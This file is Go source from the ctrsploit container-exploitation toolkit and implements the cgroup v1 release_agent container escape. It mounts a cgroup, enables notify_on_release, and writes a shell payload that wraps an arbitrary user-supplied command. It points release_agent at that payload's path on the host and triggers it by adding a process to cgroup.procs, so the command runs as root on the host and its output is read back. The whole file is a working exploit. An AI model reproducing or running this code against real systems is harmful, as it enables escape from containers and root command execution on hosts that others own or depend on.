package cgroupv1_release_agent

import (
	"flag"
	"fmt"
	"github.com/ctrsploit/ctrsploit/internal"
	"github.com/ctrsploit/ctrsploit/pkg/graphdriver"
	"github.com/ctrsploit/sploit-spec/pkg/log"
	"github.com/ssst0n3/awesome_libs/awesome_error"
	"os"
	"os/exec"
	"strings"
	"time"
)

func Exploit() {
	defer os.Exit(0)

	flagSet := flag.NewFlagSet(ExpName, flag.ContinueOnError)
	var debug bool
	var cmd string
	flagSet.BoolVar(&debug, "debug", false, "")
	flagSet.StringVar(&cmd, "cmd", "", "")
	awesome_error.CheckFatal(flagSet.Parse(os.Args[1:]))
	log.Logger.Debug("cmd: ", cmd)

	//	get the abs path under host of container's rootfs
	g := graphdriver.GraphDriver{}
	err := g.Init()
	awesome_error.CheckFatal(err)

	ReleaseAgent(cmd, g.Rootfs)
}

func ReleaseAgentCommon(cmd string, pathCtrRootfs string, trigger func(string, string, string, string) (err error)) {
	pathOutputOnCtr := fmt.Sprintf("/output%d", time.Now().Nanosecond())
	pathOutputOnHost := pathCtrRootfs + pathOutputOnCtr
	pathCmdOnCtr := fmt.Sprintf("/cmd%d", time.Now().Nanosecond())
	//pathCmdOnCtr := "/cmd"
	pathCmdOnHost := pathCtrRootfs + pathCmdOnCtr
	flagCmdStart := "===========start of result=============="
	flagCmdEnd := "===========end of result=============="

	// mount
	dirCgroup := fmt.Sprintf("/tmp/cgrp%d", time.Now().Nanosecond())
	subCroup := fmt.Sprintf("%s/%s", dirCgroup, "x")
	pathReleaseAgent := fmt.Sprintf("%s/release_agent", dirCgroup)
	pathNotifyOnRelease := fmt.Sprintf("%s/notify_on_release", subCroup)
	pathAddTask := fmt.Sprintf("%s/cgroup.procs", subCroup)

	err := os.MkdirAll(dirCgroup, 0755)
	awesome_error.CheckFatal(err)

	defer func() {
		log.Logger.Debug("rm -rf ", dirCgroup)
		err = os.RemoveAll(dirCgroup)
		if err != nil {
			awesome_error.CheckErr(err)
			return
		}
	}()
	log.Logger.Debug(dirCgroup)
	err = MountCgroupV1(dirCgroup, "rdma")
	if err != nil {
		if strings.Contains(err.Error(), "operation not permitted") {
			log.Logger.Debug("")
			log.Logger.Fatal("mount cgroup failed: ", "operation not permitted")
		}
	}
	defer func() {
		log.Logger.Debug("umount ", dirCgroup)
		awesome_error.CheckFatal(Unmount(dirCgroup))
	}()
	awesome_error.CheckFatal(os.MkdirAll(subCroup, 0755))

	// open notify_on_release
	awesome_error.CheckFatal(os.WriteFile(pathNotifyOnRelease, []byte("1"), 0755))

	// debug
	//content, err := os.ReadFile(pathNotifyOnRelease)
	//awesome_error.CheckFatal(err)
	//log.Logger.Info(content)

	if !internal.CheckPathExists(pathReleaseAgent) {
		awesome_error.CheckWarning(fmt.Errorf("%s not exists", pathReleaseAgent))
	}
	// told release_agent
	//awesome_error.CheckFatal(os.WriteFile(pathReleaseAgent, []byte(pathCmdOnHost), 0755))
	//awesome_error.CheckFatal(trigger(pathReleaseAgent, pathCmdOnHost))

	// write cmd
	payload := fmt.Sprintf("#!/bin/sh\necho %s>%s\n%s >> %s\necho %s>>%s\n", flagCmdStart, pathOutputOnHost, cmd, pathOutputOnHost, flagCmdEnd, pathOutputOnHost)
	awesome_error.CheckFatal(os.WriteFile(pathCmdOnCtr, []byte(payload), 0755))

	// debug:
	//content, err := os.ReadFile(pathCmdOnCtr)
	//awesome_error.CheckFatal(err)
	//log.Logger.Info(string(content))

	defer func() {
		log.Logger.Debug("remove ", pathCmdOnCtr)
		awesome_error.CheckFatal(os.Remove(pathCmdOnCtr))
	}()

	// told release_agent
	//awesome_error.CheckFatal(os.WriteFile(pathReleaseAgent, []byte(pathCmdOnHost), 0755))
	awesome_error.CheckFatal(trigger(pathReleaseAgent, pathCmdOnHost, pathAddTask, pathOutputOnCtr))

	// trigger task exit
	//command := exec.Command("sh", "-c", fmt.Sprintf("echo $$ > %s", pathAddTask))
	//awesome_error.CheckFatal(command.Run())

	//data, err := io.ReadAll(os.NewFile(3, "notify"))
	//awesome_error.CheckFatal(err)
	//log.Logger.Info(string(data))

	var output string
	for {
		content, err := os.ReadFile(pathOutputOnCtr)
		if err != nil && !strings.Contains(err.Error(), "no such file or directory") {
			awesome_error.CheckFatal(err)
		}
		if strings.Contains(string(content), flagCmdStart) && strings.Contains(string(content), flagCmdEnd) {
			output = string(content)
			break
		}
		time.Sleep(time.Second)
	}
	log.Logger.Info("\n", output)

	awesome_error.CheckFatal(os.Remove(pathOutputOnCtr))
}

func ReleaseAgent(cmd string, pathCtrRootfs string) {
	log.Logger.Debug("release agent start")
	ReleaseAgentCommon(cmd, pathCtrRootfs, func(pathReleaseAgent, pathCmdOnHost, pathAddTask, pathOutputOnCtr string) (err error) {
		log.Logger.Debug("trigger start")
		err = os.WriteFile(pathReleaseAgent, []byte(pathCmdOnHost), 0755)
		if err != nil {
			awesome_error.CheckErr(err)
			return
		}
		command := exec.Command("sh", "-c", fmt.Sprintf("echo $$ > %s", pathAddTask))
		awesome_error.CheckFatal(command.Run())
		return
	})
}
